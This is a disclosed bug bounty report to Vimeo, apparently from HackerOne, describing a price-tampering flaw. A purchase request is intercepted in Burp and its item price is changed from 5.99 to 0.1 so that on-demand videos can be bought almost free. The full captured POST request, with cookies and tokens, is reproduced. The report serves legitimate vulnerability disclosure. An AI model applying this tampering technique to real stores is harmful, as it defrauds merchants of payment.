@@ -1,0 +1,48 @@
+ReportLink:https://hackerone.com/reports/43602
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/defmax
+ReportedTo:Vimeo(vimeo)
+BountyAmount:260.0
+Severity:
+State:Closed
+DateOfDisclosure:13.02.2015 15:49:58
+
+Summary:
+
+hello sir 
+
+this is N B Sri Harsha 
+
+I Have found an IDOR  where we can buy ondemand videos for free ( but i tested on 0.1$)
+
+
+here is what you should do 
+
+go any  ondemand video  like https://vimeo.com/ondemand/snowman
+
+
+click on buy ! 
+
+start the burp , you wil get an request  like this 
+
+
+POST /store/ondemand/buy/28167 HTTP/1.1
+Host: vimeo.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://vimeo.com/store/ondemand/buy/28167
+Cookie: s=1; player=""; vuid=608125766.1104376581; __utma=18302654.630332069.1421183018.1421183018.1421183018.1; __utmb=18302654.6.10.1421183018; __utmc=18302654; __utmz=18302654.1421183018.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=18302654.|3=ms=0=1; optimizelySegments=%7B%22198520930%22%3A%22direct%22%2C%22213082152%22%3A%22none%22%2C%22199004622%22%3A%22ff%22%2C%22222271074%22%3A%22true%22%2C%22199138489%22%3A%22false%22%7D; optimizelyEndUserId=oeu1421183048043r0.5468938191003022; optimizelyBuckets=%7B%7D; ki_t=1421183070473%3B1421183070473%3B1421183070473%3B1%3B1; ki_r=; vod_s=%7B%22start_location%22%3A%22container%22%2C%22referrer%22%3A%22https%3A%5C%2F%5C%2Fvimeo.com%5C%2Fondemand%22%2C%22id%22%3A28167%7D; xsrft=de3c4b9f52cbd04b2aa02603f77da742.0; vimeo_cart=%7B%22ondemand%22%3A%7B%22store%22%3A%22ondemand%22%2C%22version%22%3A1%2C%22quantities%22%3A%7B%22433225%22%3A1%7D%2C%22items%22%3A%5B%7B%22id%22%3A433225%7D%5D%2C%22currency%22%3A%22USD%22%2C%22attributes%22%3A%5B%5D%7D%7D; vimeo=epk9k9dxcd70pcdxccmkcmx7jpcdxccmkxkc7l5i_e%2C5apc7%2Cpkd9mv2xcx52usfx99uffrc292xrvxcs0rcwf2f22; xsrft=12a027375de9e0e4c6f3cbbc90eabc88.acd22c2a2bdf0aed2889ddb61d9e34d7
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 696
+
+vin_WebSession_VID=5e1dba6a511e15efeb2a863ea37fec67c35c543f&vin_Transaction_nameValues_cart=%7B%22store%22%3A%22ondemand%22%2C%22version%22%3A1%2C%22quantities%22%3A%7B%22433225%22%3A1%7D%2C%22items%22%3A%5B%7B%22id%22%3A433225%7D%5D%2C%22currency%22%3A%22USD%22%2C%22attributes%22%3A%5B%5D%7D&vin_Transaction_transactionItems_0_sku=433225&vin_Transaction_transactionItems_0_name=Snow%2C+Man&vin_Transaction_transactionItems_0_price=5.99&vin_Transaction_transactionItems_0_quantity=1&vin_Transaction_transactionItems_0_taxClassification=TaxExempt&action=purchase&paypal_credit=PayPal&token=35ee3f893bc831e9c39a91003611440f.0&token=12a027375de9e0e4c6f3cbbc90eabc88.acd22c2a2bdf0aed2889ddb61d9e34d7
+
+
+now change the value of  "vin_Transaction_transactionItems_0_price" = 0.1  ,  and click forward the request 
+
+
+and pay via paypal , thats it u can watch any ondemand video for 0.1$ 
+
